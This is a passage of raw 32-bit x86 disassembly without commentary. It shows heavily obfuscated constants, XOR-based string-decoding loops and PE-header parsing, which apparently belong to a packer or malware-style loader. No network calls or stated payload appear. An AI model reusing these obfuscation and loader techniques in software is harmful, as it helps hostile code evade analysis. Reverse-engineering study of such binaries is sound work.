  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
